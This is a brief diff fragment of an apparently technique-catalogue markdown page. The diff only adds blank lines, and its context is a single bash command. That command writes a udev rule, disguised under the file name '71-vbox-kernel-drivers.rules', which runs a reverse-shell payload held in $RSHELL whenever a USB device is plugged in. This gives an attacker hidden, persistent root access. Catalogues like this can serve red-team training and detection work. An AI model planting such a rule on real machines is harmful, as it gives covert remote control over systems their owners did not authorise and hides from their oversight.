@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:34:18.258394+00:00'
 ```bash
 echo "ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
 ```
+
+
